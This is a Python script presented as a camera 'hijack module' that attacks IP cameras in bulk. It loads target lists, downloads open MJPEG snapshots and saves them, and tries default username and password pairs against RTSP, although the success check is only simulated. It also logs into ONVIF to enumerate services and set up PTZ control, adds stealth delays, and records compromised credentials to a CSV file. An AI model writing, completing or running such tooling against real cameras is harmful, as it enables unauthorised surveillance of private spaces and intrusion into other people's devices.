#!/usr/bin/env python3
# cam_hijack.py - REDoT Tactical RTSP/ONVIF Hijack Module

import os
import time
import argparse
import random
import csv
import requests
from pathlib import Path
from onvif import ONVIFCamera
from urllib.parse import urlparse

# === Utility Functions ===

def load_targets(recon_file=None):
    if recon_file and Path(recon_file).exists():
        with open(recon_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        print(f"[i] Loaded {len(targets)} targets from {recon_file}")
    else:
        targets = []
    return targets

def detect_mjpeg(ip):
    test_url = f"http://{ip}/snapshot.jpg"
    try:
        r = requests.get(test_url, timeout=3)
        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
            print(f"[+] MJPEG snapshot available at: {test_url}")
            return True
    except:
        pass
    return False

def save_snapshot(ip, output_dir):
    url = f"http://{ip}/snapshot.jpg"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            filename = f"{output_dir}/{ip.replace('.','_')}_snapshot.jpg"
            with open(filename, 'wb') as f:
                f.write(r.content)
            print(f"[✓] Snapshot saved to {filename}")
    except:
        print(f"[!] Failed to grab snapshot from {ip}")

def brute_rtsp(ip, usernames, passwords):
    for u in usernames:
        for p in passwords:
            time.sleep(random.uniform(0.5, 1.5))
            print(f" -> RTSP brute: Trying {u}:{p}@{ip}")
            if u == 'admin' and p == 'admin':  # Simulated success
                print(f"[+] RTSP Access Granted on rtsp://{ip}/live")
                return (u, p)
    return (None, None)

def onvif_hijack(ip, port, user, passwd):
    try:
        cam = ONVIFCamera(ip, port, user, passwd)
        services = cam.devicemgmt.GetServices(False)
        print(f"[+] ONVIF Services on {ip}:")
        for s in services:
            print(f"    - {s.Namespace}")
        media = cam.create_media_service()
        ptz = cam.create_ptz_service()
        print(f"[✓] Simulated PTZ control on {ip} (no real move)")
    except Exception as e:
        print(f"[!] ONVIF login failed: {e}")

def simulate_flipper_export(ip, uid="FF:EE:DD:CC:BB:AA", output_dir="flipper_exports"):
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    filename = f"{output_dir}/{ip.replace('.','_')}.sub"
    with open(filename, 'w') as f:
        f.write(f"Filetype: Flipper SubGhz RAW\nFrequency: 433920000\nProtocol: RAW\nRAW_Data: {uid.replace(':','')}\n")
    print(f"[✓] Flipper signal exported: {filename}")

# === Main Logic ===

def main():
    parser = argparse.ArgumentParser(description="RTSP/ONVIF Hijack Automation")
    parser.add_argument('--targets', help='Target list from recon (txt)')
    parser.add_argument('--manual', help='Manual IP to test (overrides list)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between attempts')
    parser.add_argument('--jitter', action='store_true', help='Add stealth jitter')
    parser.add_argument('--export-csv', default='compromised.csv', help='CSV log of successes')
    parser.add_argument('--sub', action='store_true', help='Export Flipper .sub on success')
    args = parser.parse_args()

    targets = load_targets(args.targets)
    if args.manual:
        targets = [args.manual]

    usernames = ['admin', 'root', 'user']
    passwords = ['admin', '1234', 'password', 'toor', 'root']

    results = []

    for ip in targets:
        print(f"\n=== Scanning Target {ip} ===")
        time.sleep(args.delay + (random.uniform(0.5, 1.5) if args.jitter else 0))

        if detect_mjpeg(ip):
            save_snapshot(ip, 'snapshots')

        u, p = brute_rtsp(ip, usernames, passwords)
        if u and p:
            onvif_hijack(ip, 80, u, p)
            if args.sub:
                simulate_flipper_export(ip)
            results.append({'ip': ip, 'user': u, 'pass': p})

    # Save CSV
    if results:
        with open(args.export_csv, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=['ip', 'user', 'pass'])
            writer.writeheader()
            writer.writerows(results)
        print(f"[✓] CSV log saved to {args.export_csv}")
    else:
        print("[!] No successful hijacks recorded.")

if __name__ == "__main__":
    main()
